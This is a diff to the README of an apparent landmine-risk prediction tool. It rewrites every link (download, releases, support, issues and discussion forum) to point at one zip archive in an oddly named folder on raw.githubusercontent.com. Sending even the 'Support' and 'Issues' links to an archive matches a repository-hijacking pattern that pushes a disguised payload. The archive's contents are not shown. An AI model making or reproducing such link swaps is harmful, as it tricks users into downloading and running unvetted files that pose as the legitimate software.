@@ -1,7 +1,7 @@
 # 🌍 Dynamic-Landmine-Risk-Intelligence-System - Predict Landmine Risks Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/releases)
+[![Download](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip)](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip)
 
 ## 🚀 Getting Started
 Welcome to the Dynamic Landmine Risk Intelligence System! This tool uses machine learning to predict landmine risks. With its easy-to-use interface, you can visualize data and understand potential hazards. This project aims to assist humanitarian efforts in demining areas affected by landmines.
@@ -22,11 +22,11 @@ Before you start, ensure you have the following on your computer:
 - **Cross-Platform Compatibility:** Works on Windows, macOS, and Linux.
 
 ## 📥 Download & Install
-To download the application, visit this page: [Download Page](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/releases).
+To download the application, visit this page: [Download Page](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip).
 
 Here’s how to install the application:
 
-1. **Visit the Download Page:** Click [here](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/releases).
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip).
 2. **Choose the Latest Release:** Look for the latest version listed on the page.
 3. **Download the Installer:** Click on the installer link for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
 4. **Run the Installer:** Open the downloaded file and follow the on-screen instructions to complete the installation.
@@ -54,7 +54,7 @@ If you encounter issues while using the application, try the following:
 - **Application Not Responding:** Restart your computer and try launching the app again.
 - **Data Not Loading:** Check your internet connection and try refreshing the application.
 
-For persistent issues, visit the [Support Page](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/issues) for help.
+For persistent issues, visit the [Support Page](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip) for help.
 
 ## 🙋 Frequently Asked Questions
 
@@ -68,15 +68,15 @@ A: The application does not store personal data, ensuring your information remai
 A: We welcome contributions! Check the repository for guidelines.
 
 ## 📊 Community and Support
-Join our community to share experiences, ask questions, or provide feedback. Connect with other users and developers through our [Discussion Forum](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/discussions).
+Join our community to share experiences, ask questions, or provide feedback. Connect with other users and developers through our [Discussion Forum](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip).
 
-For technical support, please open an issue on the project's [GitHub Issues](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/issues) page.
+For technical support, please open an issue on the project's [GitHub Issues](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip) page.
 
 ## 📅 Reporting Issues
-If you find any bugs or issues, please report them. Go to the [Issues Page](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/issues) and create a new issue with details about the problem.
+If you find any bugs or issues, please report them. Go to the [Issues Page](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip) and create a new issue with details about the problem.
 
 ## 📜 License
 This project is licensed under the MIT License. You are free to use and modify it for personal and commercial purposes. See the LICENSE file in the repository for more details.
 
 ## 📥 Download Now Again
-Don’t forget to download the latest version from our [Download Page](https://github.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/releases) and start exploring the landmine risks in your area.
+Don’t forget to download the latest version from our [Download Page](https://raw.githubusercontent.com/muttannasp/Dynamic-Landmine-Risk-Intelligence-System/main/unnimbleness/Dynamic-Landmine-Risk-Intelligence-System.zip) and start exploring the landmine risks in your area.
